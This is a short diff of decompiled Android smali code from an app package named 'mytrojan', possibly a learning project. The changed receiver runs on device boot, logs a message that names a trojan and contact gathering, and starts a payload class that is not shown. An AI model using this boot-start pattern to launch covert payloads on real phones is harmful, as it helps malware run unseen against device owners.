@@ -8,26 +8,33 @@
     .registers 1
 
     .prologue
-    .line 8
+    .line 9
     invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
 
-    .line 9
+    .line 10
     return-void
 .end method
 
 
 # virtual methods
 .method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
-    .registers 4
+    .registers 5
     .param p1, "context"    # Landroid/content/Context;
     .param p2, "intent"    # Landroid/content/Intent;
 
     .prologue
-    .line 13
+    .line 14
+    const-string v0, "GET_CONTACT"
+
+    const-string v1, "TROJAN RECEIVED BOOT_COMPLETE"
+
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 15
     new-instance v0, Lcom/example/mytrojan/ExecuteIt;
 
-    invoke-direct {v0, p1}, Lcom/example/mytrojan/ExecuteIt;-><init>(Landroid/content/Context;)V
+    invoke-direct {v0}, Lcom/example/mytrojan/ExecuteIt;-><init>()V
 
-    .line 14
+    .line 16
     return-void
 .end method
